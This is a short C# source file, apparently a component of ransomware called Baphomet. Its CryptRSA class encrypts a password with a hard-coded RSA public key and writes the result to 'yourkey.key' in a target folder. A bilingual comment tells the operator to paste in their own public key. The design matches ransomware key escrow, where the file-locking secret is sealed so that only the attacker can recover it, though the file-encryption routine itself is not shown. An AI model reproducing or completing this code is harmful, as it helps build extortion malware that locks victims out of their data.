using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities
{
    public class CryptRSA
    {
        public  void EncryptText(string targetPath ,string password)
        {
            //Pega tu llave publica aqui! / Paste your public key here!
            string publicKey = "<RSAKeyValue><Modulus>3Lxv3N5nI2X+W+tlpHNaBXRKvSCb2D6oNnm7eHF14BXNLtsvL/6F+UtZqxW1QFNh46084PyhLVtlZPIhkqWcBErJkeFZGulQjalynTNzb6w5tEBnBcow2VLfwEYEFTaD78AnVQdtA+8TqqmmZtxlohY2UWBSIx/ELLbD8PQC0U0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
            // Convierto el password a un array byte 
            UnicodeEncoding byteConverter = new UnicodeEncoding();
            byte[] dataToEncrypt = byteConverter.GetBytes(password);

            // Creo un array byte para almazenar la data encriptada(password)  
            byte[] encryptedData;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
            {
                // Set rsa pulic key   
                rsa.FromXmlString(publicKey);

                encryptedData = rsa.Encrypt(dataToEncrypt, false);
            }
             File.WriteAllBytes(targetPath + "\\yourkey.key", encryptedData);
        }
    }
}
